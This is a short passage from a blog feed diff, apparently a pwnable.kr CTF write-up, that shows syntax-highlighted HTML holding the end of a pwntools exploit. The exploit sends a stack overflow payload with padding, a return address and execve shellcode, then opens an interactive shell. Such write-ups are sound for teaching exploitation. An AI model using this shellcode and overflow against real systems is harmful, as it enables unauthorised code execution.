'>e3</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>b0</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>0b</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>cd</span><span style='color:#0f69ff; '>\x</span><span style='color:#1060b6; '>80"</span>
+r<span style='color:#308080; '>.</span>send<span style='color:#308080; '>(</span><span style='color:#1060b6; '>'a'</span><span style='color:#44aadd; '>*</span><span style='color:#008c00; '>20</span><span style='color:#44aadd; '>+</span>p32<span style='color:#308080; '>(</span>stack_addr<span style='color:#44aadd; '>+</span><span style='color:#008c00; '>20</span><span style='color:#308080; '>)</span><span style='color:#44aadd; '>+</span>shellcode<span style='color:#308080; '>)</span>
+r<span style='color:#308080; '>.</span>interactive<span style='color:#308080; '>(</span><span style='color:#308080; '>)</span>
+</pre>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[[pwnable.kr] Fd]]></title>
